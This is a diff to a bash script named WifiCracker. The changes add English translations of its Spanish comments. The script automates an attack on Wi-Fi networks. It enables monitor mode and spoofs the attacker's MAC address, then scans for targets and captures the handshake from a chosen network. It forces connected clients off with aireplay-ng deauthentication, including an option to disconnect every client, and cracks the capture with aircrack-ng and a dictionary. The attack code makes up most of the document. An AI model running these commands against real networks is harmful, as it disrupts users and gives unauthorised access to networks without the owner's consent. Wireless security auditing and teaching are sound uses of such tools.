@@ -1,12 +1,18 @@
 # Programa en bash hecho para averiguar la contraseña de un Wifi por medio de
 # deautenticación de clientes conectados a la misma - (https://github.com/Marcelorvp/WifiCracker)
 
+# Program made in bash that allows you to obtain Wifi's passwords through clients de-authentication
+# connected to the network - (https://github.com/Marcelorvp/WifiCracker)
+
 # Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra
 
 #!/bin/bash
 
 # ¡¡Debes de ejecutar el programa siendo superusuario!! [No hace falta estar conectado a
 # ninguna red para ejecutar este programa]
+
+# ¡¡You must run the program as root!! [Is not necessary to be connected at any network
+# for running the program]
 
 monitor="mon0"
 usuario=$(whoami)
@@ -16,6 +22,8 @@ value=1
 monitorMode(){
 
   #Tienes que ser root para ejecutar esta opción, de lo contrario no podrás
+
+  #You must execute this option as root, otherwise you won't be able
 
   if [ "$usuario" = "root" ]; then
     echo " "
@@ -37,6 +45,10 @@ monitorMode(){
       # que estén conectados a la red, también los no asociados a ninguna (con sus
       # respectivas direcciones MAC).
 
+      # Enabling monitor mode, we can capture and hear any kind of package travelling
+      # in the air. Also we capture not only those users connected to the network,
+      # also not-associated clientes (with their respectives MAC addresses).
+
       airmon-ng start $tarjetaRed
       value=2
       echo " "
@@ -54,6 +66,10 @@ monitorMode(){
       # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
       # nuevamente dada de alta.
 
+      # Next we are going to change our MAC address, we will do it for doing a safe
+      # 'attack' on monitor mode. Whenever we want to make a change in an interface, first
+      # we have to disable it. Later, when making changes ... this will have to be re-released.
+
       macchanger -a mon0
       echo " "
       echo "Dando de alta la interfaz mon0"
@@ -70,6 +86,10 @@ monitorMode(){
       # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
       # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
       # que teníamos desde un principio.
+
+      # If we wanted to see if our MAC address has been changed, we can use 'macchanger -s mon0'.
+      # This show us 2 MAC addresses, first is 'New MAC' corresponding to the random MAC program itself offers.
+      # Second is 'Permanent MAC', corresponding to our real MAC adress, it will be refunded once we finish the process.
 
     else
       echo " "
@@ -92,6 +112,10 @@ interfacesMode(){
   # de baja o realices algún cambio, esta opción te permitirá ver qué está ocurriendo con las
   # interfaces.
 
+  # If you have already started the monitor mode, you will see that now instead of having 3 interfaces,
+  # you have 4, and one of them being 'mon0', corresponding to monitor mode. When desabling or enabling,
+  # this option will show you what is happening on interfaces.
+
   echo " "
   echo "Abriendo configuración de interfaz..."
   echo " "
@@ -113,6 +137,9 @@ monitorDown(){
     # Con este comando detienes por completo el modo monitor. Siempre que quieras
     # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
     # a través de la opción 1.
+
+    # With this command, you stop the monitor mode. Whenever you want to use it
+    # again once stopped... you'll have to create it again through option 1
 
     airmon-ng stop mon0
     echo " "
@@ -142,6 +169,12 @@ wifiScanner(){
     # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
     # te avisará de que es necesario inicializar el modo monitor, de lo contrario
     # no te será permitido el escaneo de redes.
+
+    # 'airodump-ng' allows us to analyze the available networks via an specific interface,
+    # in our case... 'mon0'. It might be simpler to do 'airodump-ng wlp2s0' with our
+    # own network card and access the scanning wireless networks ... but the program itself
+    # will warn you it's necessary to initialize monitor mode, otherwise... you will not be
+    # allowed to network scanning
 
     airodump-ng mon0
     echo " "
@@ -175,6 +208,10 @@ wifiScanner(){
     # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
     # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.
 
+    # The following command can also be use by the following syntax: airodump-ng -c '' -w '' --bssid '$ wifiMAC' mon0
+    # 'essid' corresponding to the Wifi's name and 'bssid' to his MAC adress. What we are doing with this is focussing
+    # on a unique network especified by parameters, isolating the other networks.
+
     airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0
 
   else
@@ -189,8 +226,11 @@ wifiScanner(){
 wifiPassword(){
 
   # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
-  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, primero
+  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
   # por fines prácticos nos será de utilidad verlo de esta forma)
+
+  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
+  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)
 
   echo " "
   echo "Esta opción sólo deberías ejecutarla si ya has hecho los pasos 1, 4 y 5... de lo contrario no obtendrás nada"
@@ -217,6 +257,10 @@ wifiPassword(){
   # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
   # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
   # carpeta de manera manual, puede que el nombre tenga ligeros cambios.
+
+  # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
+  # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
+  # to the name again inside the folder, the name may have slight changes.
 
   aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
   sleep 10
@@ -254,18 +298,24 @@ macAttack(){
   sleep 13
 
   # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
-  # a que se genere el Handshake. El Handshake se genera en el momento en el que el usuario se vuelve a reconectar
-  # a la red (esto no siempre es así, pero por fines prácticos... diremos que es así).
-  
+  # a que se genere el Handshake.
+
+  # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated.
+
   aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0
 
   # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
   # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
   # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
 
+  # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
+  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0
+
 }
 
 # Escoge esta opción sólo si no hay clientes conectados a la red
+
+# Choose this option only if there are no clients connected to the network
 
 fakeAuth(){
 
